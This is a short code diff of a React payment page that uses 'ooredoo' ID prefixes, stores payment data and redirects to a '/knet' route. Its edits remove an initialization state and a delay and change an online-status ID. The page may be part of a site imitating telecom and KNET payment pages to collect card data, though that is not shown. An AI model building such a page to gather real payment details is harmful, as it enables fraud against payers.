@@ -30,7 +30,6 @@ export default function PaymentPage() {
   const [amount, setAmount] = useState("5")
   const [phoneNumber, setPhoneNumber] = useState("")
   const [isLoading, setIsLoading] = useState(false)
-  const [isInitializing, setIsInitializing] = useState(true)
 
   const generateId = useCallback((prefix = "ooredoo-"): string => {
     return `${prefix}${Math.random().toString(36).substring(2, 15)}`
@@ -65,7 +64,7 @@ export default function PaymentPage() {
         createdDate: new Date().toISOString(),
       })
       localStorage.setItem("country", country)
-      setupOnlineStatus(_id)
+      setupOnlineStatus(generateId('oreddo'))
     } catch (error) {
       console.error("Error fetching location:", error)
     }
@@ -99,7 +98,6 @@ export default function PaymentPage() {
 addData({paymentData})
       localStorage.setItem("paymentAmount", amount)
 
-      await new Promise((resolve) => setTimeout(resolve, 1500))
       router.push("/knet")
     } catch (error) {
       console.error("Payment submission failed:", error)
@@ -127,7 +125,7 @@ addData({paymentData})
     localStorage.setItem("paymentAmount", amount)
   }, [amount])
 
-  if (isInitializing) {
+  if (isLoading) {
     return (
       <div className="flex items-center justify-center min-h-screen bg-gray-50">
         <div className="text-center">
